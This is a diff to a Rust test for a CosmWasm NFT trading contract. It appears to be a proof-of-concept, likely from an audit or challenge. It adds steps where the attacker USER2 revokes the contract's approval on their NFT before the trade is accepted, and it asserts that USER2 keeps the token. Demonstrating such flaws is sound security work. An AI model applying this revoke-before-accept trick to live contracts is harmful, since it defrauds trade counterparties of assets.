@@ -413,6 +413,18 @@ pub mod tests {
         assert_eq!(owner_of.trader, USER2.to_string());
 
         // Accept trade
+        // exploit - revoke approval as USER2 (our attacker in this scenario)
+        app.execute_contract(
+            Addr::unchecked(USER2),
+            token_addr.clone(),
+            &cw721_base::msg::ExecuteMsg::Revoke::<Empty, Empty> {
+                spender: contract_addr.to_string(),
+                token_id: NFT2.to_string(),
+            },
+            &[],
+        )
+        .unwrap();
+
         app.execute_contract(
             Addr::unchecked(USER1),
             contract_addr,
@@ -446,6 +458,6 @@ pub mod tests {
                 },
             )
             .unwrap();
-        assert_eq!(owner_of.owner, USER1.to_string());
+        assert_eq!(owner_of.owner, USER2.to_string()); // exploit result - USER2 still owns their NFT
     }
 }
